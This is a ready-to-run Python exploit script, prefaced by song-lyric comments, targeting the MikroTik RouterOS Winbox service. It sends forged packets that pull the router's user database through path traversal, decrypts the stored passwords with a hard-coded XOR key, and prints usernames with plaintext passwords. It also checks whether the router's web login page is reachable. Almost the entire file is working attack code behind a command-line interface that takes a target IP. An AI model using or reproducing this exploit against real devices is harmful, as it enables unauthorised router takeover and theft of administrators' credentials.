#!/usr/bin/env python3

# We're no strangers to love
# You know the rules and so do I (do I)
# A full commitment's what I'm thinking of
# You wouldn't get this from any other guy
# I just wanna tell you how I'm feeling
# Gotta make you understand
# Never gonna give you up
# Never gonna let you down
# Never gonna run around and desert you
# Never gonna make you cry
# Never gonna say goodbye
# Never gonna tell a lie and hurt you

import socket
import hashlib
import requests
import argparse
from typing import Tuple, Set

class MikroTikWinboxExploit:
    def __init__(self, target_ip: str, target_port: int = 8291):
        self.target_ip = target_ip
        self.target_port = target_port

    def exploit(self):
        init_pkt = self._forge_init_pkt()
        file_req_pkt = self._forge_file_req_pkt()
        try:
            with socket.create_connection((self.target_ip, self.target_port), timeout=3) as s:
                s.sendall(init_pkt)
                response = bytearray(s.recv(1024))
                session_id = response[38]
                file_req_pkt[19] = session_id
                s.sendall(file_req_pkt)
                response = bytearray(s.recv(1024))
                if len(response[55:]) > 25:
                    self._extract_credentials(response[55:])
                else:
                    print('Exploit failed')
        except socket.timeout:
            pass
        except (socket.error, ConnectionRefusedError) as e:
            pass
        except Exception:
            pass

    def _forge_init_pkt(self) -> bytearray:
        init_pkt = bytearray([
            0x68, 0x01, 0x00, 0x66, 0x4d, 0x32, 0x05, 0x00,
            0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x05, 0x07,
            0x00, 0xff, 0x09, 0x07, 0x01, 0x00, 0x00, 0x21,
            0x35, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2e, 0x2f,
            0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f,
            0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f,
            0x2f, 0x2f, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x66,
            0x6c, 0x61, 0x73, 0x68, 0x2f, 0x72, 0x77, 0x2f,
            0x73, 0x74, 0x6f, 0x72, 0x65, 0x2f, 0x75, 0x73,
            0x65, 0x72, 0x2e, 0x64, 0x61, 0x74, 0x02, 0x00,
            0xff, 0x88, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0xff, 0x88,
            0x02, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00,
            0x00, 0x00
        ])
        return init_pkt

    def _forge_file_req_pkt(self) -> bytearray:
        file_req_pkt = bytearray([
            0x3b, 0x01, 0x00, 0x39, 0x4d, 0x32, 0x05, 0x00,
            0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x06, 0x01,
            0x00, 0xfe, 0x09, 0x35, 0x02, 0x00, 0x00, 0x08,
            0x00, 0x80, 0x00, 0x00, 0x07, 0x00, 0xff, 0x09,
            0x04, 0x02, 0x00, 0xff, 0x88, 0x02, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01,
            0x00, 0xff, 0x88, 0x02, 0x00, 0x02, 0x00, 0x00,
            0x00, 0x02, 0x00, 0x00, 0x00
        ])
        return file_req_pkt

    def _decrypt_pwd(self, usr: bytes, pwd_enc: bytes) -> str:
        key = hashlib.md5(usr + b"283i4jfkai3389").digest()
        pwd = "".join([chr(pwd_enc[i] ^ key[i % len(key)]) for i in range(len(pwd_enc))])
        return pwd.split("\x00")[0]

    def _extract_creds_from_entry(self, entry: bytes) -> Tuple[str, str]:
        usr_data = entry.split(b"\x01\x00\x00\x21")[1]
        pwd_data = entry.split(b"\x11\x00\x00\x21")[1]
        usr_len = usr_data[0]
        pwd_len = pwd_data[0]
        usr = usr_data[1:1 + usr_len].decode("utf-8", "backslashreplace")
        pwd = self._decrypt_pwd(usr_data[1:1 + usr_len], pwd_data[1:1 + pwd_len])
        return usr, pwd

    def _get_creds(self, data: bytes) -> Set[Tuple[str, str]]:
        creds_list = set()
        entries = data.split(b"M2")[1:]
        for entry in entries:
            try:
                usr, pwd_plain = self._extract_creds_from_entry(entry)
                creds_list.add((usr, pwd_plain))
            except Exception:
                continue
        return creds_list

    def _extract_credentials(self, data: bytes):
        credentials = self._get_creds(data)
        for user, passw in credentials:
            print(f"[+] Target {self.target_ip} | Found Credentials | Username: {user} | Password: {passw}")

    def _detect_login(self):
        url = f'http://{self.target_ip}'
        try:
            response = requests.get(url, timeout=10)
            if '<title>RouterOS router configuration page</title>' in response.text:
                print(f"[+] MikroTik RouterOS login detected at {self.target_ip}")
        except requests.exceptions.RequestException:
            pass

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="")
    parser.add_argument("-ip", "--target_ip", required=True, help="Target IP to exploit.")
    parser.add_argument("-detect-login", "--detect_login", action='store_true', help="Detect login panel.")
    args = parser.parse_args()

    exploit = MikroTikWinboxExploit(args.target_ip)
    exploit.exploit()
    if args.detect_login:
        exploit._detect_login()  
